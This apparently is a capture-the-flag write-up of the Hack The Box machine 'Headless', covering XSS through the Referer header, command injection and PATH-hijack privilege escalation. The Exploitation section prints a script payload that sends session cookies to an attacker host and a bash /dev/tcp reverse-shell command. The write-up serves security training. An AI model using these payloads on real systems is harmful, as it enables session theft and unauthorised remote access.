# Headless Writeup - by Thammanant Thamtaranon  
- Headless is an easy Linux-based machine hosted on Hack The Box.

## Reconnaissance  
- We began by performing a full TCP port scan with version detection and OS fingerprinting using the command:  
  `nmap -A -T4 -p- 10.10.11.8`  
![Nmap_Scan](Nmap_Scan.png)

## Scanning & Enumeration  
- We enumerated web directories using:  
  `dirsearch -u http://10.10.11.8:5000`  
![Dirsearch_Scan](Dirsearch_Scan.png)  
- One interesting path we discovered was:  
  `http://10.10.11.8:5000/support`

## Exploitation  
- We initially tested for XSS vulnerabilities through standard input fields.  
![XSS_Failed](XSS_Failed.png)  
- This failed, but testing the **Referer** header instead proved successful.  
![XSS_Work1](XSS_Work1.png)  
![XSS_Work2](XSS_Work2.png)  
- We modified the payload to exfiltrate cookies:  
  `<script>fetch("http://10.10.16.11:8000/steal?cookie=" + document.cookie);</script>`  
![XSS_POC](XSS_POC.png)  
- This gave us the session cookie and access to `/dashboard`.  
![Cookie](Cookie.png)

- While analyzing a command form using Burp Suite, we attempted command injection using `;+id`, which worked.  
![ComInj](ComInj.png)  
- We upgraded the payload to gain a reverse shell using:  
  `/bin/bash+-c+'/bin/bash+-i+>%26+/dev/tcp/10.10.16.11/4444+0>%261'`  
- This gave us a shell as the user `dvir`.  
![Shell](Shell.png)  
- We then captured the **user flag**.

## Privilege Escalation  
- Running `sudo -l`, we discovered a script that can be executed as root.  
![SUDO](SUDO.png)
- The script referenced a file called `initdb.sh` using a relative path:  
  `if ! pgrep -x "initdb.sh" &>/dev/null;`
![CAT](CAT.png)  
- This is vulnerable to **PATH hijacking**, allowing us to place our own malicious `initdb.sh` in the current directory.  
- We created a shell script, named it `initdb.sh`, gave it execution permission, and run the command `sudo /usr/bin/syscheck`.  
![Root](Root.png)  
- We received a shell as `root` and obtained the **root flag**.
